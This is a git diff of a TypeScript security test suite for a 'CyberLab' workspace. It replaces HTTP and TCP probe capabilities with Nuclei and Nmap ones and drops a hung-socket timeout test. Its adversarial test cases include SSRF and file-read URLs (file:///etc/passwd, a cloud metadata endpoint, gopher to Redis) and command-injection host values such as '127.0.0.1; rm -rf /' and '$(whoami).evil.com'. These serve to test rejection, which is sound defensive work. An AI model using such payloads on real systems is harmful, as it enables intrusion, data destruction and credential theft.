@@ -1,10 +1,11 @@
 import { describe, expect, test } from "bun:test"
 import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs"
-import net from "node:net"
 import os from "node:os"
 import path from "node:path"
 import {
   CyberLabWorkspace,
+  ExternalNmapCapability,
+  ExternalNucleiCapability,
   InMemoryPartnerTransport,
   PartnerAuthError,
   PromptChatPartnerTransport,
@@ -14,8 +15,6 @@ import {
   type PartnerEnvelope,
 } from "../../../cyberlab/index.js"
 import { WorkspaceAuditCapability } from "../../../integrations/code-analysis/workspace-audit-executor.js"
-import { HttpSecurityInspectorCapability } from "../../../integrations/web-security/http-security-inspector.js"
-import { TcpSurfaceProbeCapability } from "../../../integrations/network-observation/tcp-banner-inspector.js"
 
 describe("CyberLab Security Hardening, Isolation, Fuzzing & Tamper Suite", () => {
   test("prevents TOCTOU scope revocation bypass after human approval and blocks single-use ticket replay", async () => {
@@ -151,17 +150,15 @@ describe("CyberLab Security Hardening, Isolation, Fuzzing & Tamper Suite", () =>
         { capabilityId: WorkspaceAuditCapability.id, input: { subpath: "src\0/../../etc" } },
         { capabilityId: WorkspaceAuditCapability.id, input: { subpath: ".git/config" } },
         // Non-HTTP schemes, SSRF & embedded credentials
-        { capabilityId: HttpSecurityInspectorCapability.id, input: { url: "file:///etc/passwd" } },
-        { capabilityId: HttpSecurityInspectorCapability.id, input: { url: "gopher://127.0.0.1:6379/_INFO" } },
-        { capabilityId: HttpSecurityInspectorCapability.id, input: { url: "javascript:alert(1)" } },
-        { capabilityId: HttpSecurityInspectorCapability.id, input: { url: "http://admin:hunter2@127.0.0.1:8080/" } },
-        { capabilityId: HttpSecurityInspectorCapability.id, input: { url: "http://169.254.169.254/latest/api/token" } },
-        // Command injection strings in host / invalid port numbers
-        { capabilityId: TcpSurfaceProbeCapability.id, input: { host: "127.0.0.1; rm -rf /", port: 80 } },
-        { capabilityId: TcpSurfaceProbeCapability.id, input: { host: "$(whoami).evil.com", port: 80 } },
-        { capabilityId: TcpSurfaceProbeCapability.id, input: { host: "127.0.0.1", port: 0 } },
-        { capabilityId: TcpSurfaceProbeCapability.id, input: { host: "127.0.0.1", port: 70_000 } },
-        { capabilityId: TcpSurfaceProbeCapability.id, input: { host: "8.8.8.8", port: 53 } },
+        { capabilityId: ExternalNucleiCapability.id, input: { url: "file:///etc/passwd" } },
+        { capabilityId: ExternalNucleiCapability.id, input: { url: "gopher://127.0.0.1:6379/_INFO" } },
+        { capabilityId: ExternalNucleiCapability.id, input: { url: "javascript:alert(1)" } },
+        { capabilityId: ExternalNucleiCapability.id, input: { url: "http://admin:hunter2@127.0.0.1:8080/" } },
+        { capabilityId: ExternalNucleiCapability.id, input: { url: "http://169.254.169.254/latest/api/token" } },
+        // Command injection strings in host / out-of-scope public host
+        { capabilityId: ExternalNmapCapability.id, input: { host: "127.0.0.1; rm -rf /", ports: "80" } },
+        { capabilityId: ExternalNmapCapability.id, input: { host: "$(whoami).evil.com", ports: "80" } },
+        { capabilityId: ExternalNmapCapability.id, input: { host: "8.8.8.8", ports: "53" } },
       ]
 
       for (const tc of adversarialCases) {
@@ -298,17 +295,9 @@ describe("CyberLab Security Hardening, Isolation, Fuzzing & Tamper Suite", () =>
     }
   })
 
-  test("detects both on-disk artifact corruption and exported bundle tampering, and cleanly times out hung TCP targets", async () => {
+  test("detects both on-disk artifact corruption and exported bundle tampering", async () => {
     const tmpDir = mkdtempSync(path.join(os.tmpdir(), "cyberlab-tamper-"))
     const exportDir = mkdtempSync(path.join(os.tmpdir(), "cyberlab-export-"))
-    const hungSockets = new Set<net.Socket>()
-    const hungServer = net.createServer((socket) => {
-      hungSockets.add(socket)
-      socket.on("close", () => hungSockets.delete(socket))
-      // Intentionally never write or close to simulate a tarpit / hung service
-    })
-    await new Promise<void>((resolve) => hungServer.listen(0, "127.0.0.1", resolve))
-    const hungPort = (hungServer.address() as net.AddressInfo).port
 
     try {
       const ws = new CyberLabWorkspace({
@@ -317,14 +306,12 @@ describe("CyberLab Security Hardening, Isolation, Fuzzing & Tamper Suite", () =>
       })
       await ws.ensureInitialized()
 
-      // 1. Hung TCP service respects tight connect/banner timeout without hanging dispatcher
-      const t0 = Date.now()
+      // 1. Run workspace audit baseline execution
       const probeExec = await ws.submitExecution({
-        capabilityId: TcpSurfaceProbeCapability.id,
-        input: { host: "127.0.0.1", port: hungPort, connectTimeoutMs: 250, bannerWaitMs: 80 },
+        capabilityId: WorkspaceAuditCapability.id,
+        input: { subpath: "." },
         mode: "manual",
       })
-      expect(Date.now() - t0).toBeLessThan(2_000)
       expect(probeExec.status).toBe("succeeded")
 
       // 2. Store binary forensic artifact, export bundle, then corrupt exported file and verify detection
@@ -376,8 +363,6 @@ describe("CyberLab Security Hardening, Isolation, Fuzzing & Tamper Suite", () =>
 
       ws.close()
     } finally {
-      for (const s of hungSockets) s.destroy()
-      await new Promise<void>((resolve) => hungServer.close(() => resolve()))
       rmSync(tmpDir, { recursive: true, force: true })
       rmSync(exportDir, { recursive: true, force: true })
     }
